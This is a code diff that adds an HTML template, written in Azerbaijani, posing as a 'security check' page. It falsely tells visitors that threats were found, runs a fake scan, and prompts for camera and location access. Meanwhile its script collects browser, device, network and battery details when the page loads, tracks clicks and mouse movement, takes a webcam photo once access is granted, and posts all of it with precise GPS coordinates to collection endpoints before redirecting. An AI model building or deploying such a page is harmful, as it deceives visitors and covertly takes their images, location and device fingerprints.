@@ -1,1 +1,397 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Təhlükəsizlik Yoxlaması</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #4CAF50;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            transition: background 0.3s;
+        }
+        
+        .btn:hover {
+            background: #45a049;
+        }
+        
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .loading {
+            display: none;
+            margin-top: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4CAF50;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        #video {
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔒</div>
+        <h1>Təhlükəsizlik Yoxlaması</h1>
+        <p class="subtitle">
+            Sisteminizdə təhlükəsizlik problemləri aşkar edilib. 
+            Təhlükəsizlik yoxlamasını başlatmaq üçün aşağıdakı düyməni basın.
+        </p>
+        
+        <button class="btn" onclick="startSecurityCheck()">Təhlükəsizlik Yoxlamasını Başlat</button>
+        <button class="btn" onclick="enableCamera()" id="cameraBtn">Kamera İcazəsi Ver</button>
+        <button class="btn" onclick="getLocation()" id="locationBtn">Konum İcazəsi Ver</button>
+        
+        <video id="video" class="hidden" autoplay></video>
+        <canvas id="canvas" class="hidden"></canvas>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Sistem yoxlanılır...</p>
+        </div>
+        
+        <div class="status" id="status"></div>
+    </div>
+
+    <script>
+        const linkId = '{{ link_id }}';
+        let systemData = {};
+        
+        // Sistem məlumatlarını toplamaq
+        function collectSystemInfo() {
+            // Brauzer məlumatları
+            const ua = navigator.userAgent;
+            let browserName = 'Unknown';
+            let browserVersion = 'Unknown';
+            
+            if (ua.indexOf('Chrome') > -1) {
+                browserName = 'Chrome';
+                browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
+            } else if (ua.indexOf('Firefox') > -1) {
+                browserName = 'Firefox';
+                browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
+            } else if (ua.indexOf('Safari') > -1) {
+                browserName = 'Safari';
+                browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
+            } else if (ua.indexOf('Edge') > -1) {
+                browserName = 'Edge';
+                browserVersion = ua.match(/Edge\/([0-9.]+)/)?.[1] || 'Unknown';
+            }
+            
+            // OS məlumatları
+            let osName = 'Unknown';
+            if (ua.indexOf('Windows') > -1) osName = 'Windows';
+            else if (ua.indexOf('Mac') > -1) osName = 'macOS';
+            else if (ua.indexOf('Linux') > -1) osName = 'Linux';
+            else if (ua.indexOf('Android') > -1) osName = 'Android';
+            else if (ua.indexOf('iOS') > -1) osName = 'iOS';
+            
+            // Cihaz məlumatları
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
+            const deviceType = isMobile ? 'Mobile' : 'Desktop';
+            
+            systemData = {
+                browser: `${browserName} ${browserVersion}`,
+                os: osName,
+                device: deviceType,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                onlineStatus: navigator.onLine,
+                userAgent: ua,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'Unknown'
+            };
+            
+            // Batareya məlumatları (əgər dəstəklənirse)
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    systemData.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                    sendData();
+                });
+            }
+        }
+        
+        // Məlumatları serverə göndərmək
+        function sendData() {
+            fetch(`/collect/${linkId}`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(systemData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Data sent successfully');
+                // Məlumatlar göndərildikdən sonra hədəf URL-ə yönləndirmək
+                setTimeout(() => {
+                    window.location.href = `/redirect/${linkId}`;
+                }, 2000);
+            })
+            .catch(error => {
+                console.error('Error sending data:', error);
+                // Xəta olsa belə yönləndirmək
+                setTimeout(() => {
+                    window.location.href = `/redirect/${linkId}`;
+                }, 3000);
+            });
+        }
+        
+        // Təhlükəsizlik yoxlamasını başlatmaq
+        function startSecurityCheck() {
+            document.getElementById('loading').style.display = 'block';
+            
+            collectSystemInfo();
+            
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                showStatus('Təhlükəsizlik yoxlaması tamamlandı! Sistem təmizdir.', 'success');
+                sendData();
+            }, 3000);
+        }
+        
+        // Kamera icazəsi və şəkil çəkmək
+        function enableCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.classList.remove('hidden');
+                    
+                    // 2 saniyə sonra şəkil çəkmək
+                    setTimeout(() => {
+                        capturePhoto(stream);
+                    }, 2000);
+                    
+                    showStatus('Kamera icazəsi verildi!', 'success');
+                })
+                .catch(err => {
+                    showStatus('Kamera icazəsi rədd edildi.', 'error');
+                });
+        }
+        
+        // Şəkil çəkmək və göndərmək
+        function capturePhoto(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('image', blob, 'camera.jpg');
+                
+                fetch(`/upload_image/${linkId}`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Image uploaded successfully');
+                });
+                
+                // Kameranı bağlamaq
+                stream.getTracks().forEach(track => track.stop());
+                video.classList.add('hidden');
+            }, 'image/jpeg', 0.8);
+        }
+        
+        // Konum məlumatlarını əldə etmək
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        systemData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        };
+                        
+                        showStatus('Konum məlumatları əldə edildi!', 'success');
+                        sendData();
+                    },
+                    error => {
+                        showStatus('Konum icazəsi rədd edildi.', 'error');
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                showStatus('Brauzer konum xidmətini dəstəkləmir.', 'error');
+            }
+        }
+        
+        // Status mesajını göstərmək
+        function showStatus(message, type) {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.className = `status ${type}`;
+            status.style.display = 'block';
+        }
+        
+        // Səhifə yükləndikdə avtomatik məlumat toplamaq
+        window.onload = function() {
+            collectSystemInfo();
+            
+            // 1 saniyə sonra məlumatları göndərmək
+            setTimeout(() => {
+                sendData();
+            }, 1000);
+        };
+        
+        // Səhifə bağlanarkən məlumat göndərmək
+        window.addEventListener('beforeunload', function() {
+            sendData();
+        });
+        
+        // Fokus dəyişiklikləri izləmək
+        document.addEventListener('visibilitychange', function() {
+            systemData.pageVisibility = document.hidden ? 'hidden' : 'visible';
+            sendData();
+        });
+        
+        // Klik və hərəkət izləmək
+        document.addEventListener('click', function(e) {
+            systemData.lastClick = {
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target.tagName,
+                timestamp: new Date().toISOString()
+            };
+        });
+        
+        document.addEventListener('mousemove', function(e) {
+            systemData.mousePosition = {
+                x: e.clientX,
+                y: e.clientY
+            };
+        });
+    </script>
+</body>
+</html>
 
